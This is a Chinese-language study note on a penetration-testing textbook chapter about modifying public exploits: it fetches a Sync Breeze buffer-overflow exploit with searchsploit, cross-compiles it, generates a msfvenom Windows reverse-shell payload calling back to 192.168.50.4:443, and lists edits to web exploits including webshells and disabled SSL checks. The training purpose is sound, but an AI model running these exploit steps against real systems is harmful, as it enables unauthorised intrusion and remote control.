本篇对应教材第13章，主要内容“修改内存破坏型exp”、“修改WEB应用exp”，记录使用工具和命令

## 13.1 修改内存损坏型exp

```python
searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341
```

跨平台编译

```python
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
```

报错，需要加入库文件

```python
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

需要注意的exp常见修改位置

```python
缓冲区大小
jmpesp地址
目标IP和端口
shellcode
shellcode前面加nop
```

msf生成shellcode

```python
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

修改后重新编译

```python
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
```

wine执行

```python
sudo wine syncbreeze_exploit.exe
```

## 13.2 修改Web应用exp

常见修改位置

```python
http变为https
ssl校验
账号密码
文件名
webshell
http头中的字段，如csrf_param = "_sk_"
```

```python
...
    response  = requests.post(url, data=data, allow_redirects=False)
...
    response = requests.post(url, data=data, files=txt, cookies=cookies)
...
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False)
...
```

取消ssl校验

```python
...
    response  = requests.post(url, data=data, allow_redirects=False, verify=False)
...
    response = requests.post(url, data=data, files=txt, cookies=cookies, verify=False)
...
    response = requests.post(url, data=data, cookies=cookies, allow_redirects=False, verify=False)
...
```

更多更新资料（微信公众号：TopRedTeam）

![](./qrcode.jpg)
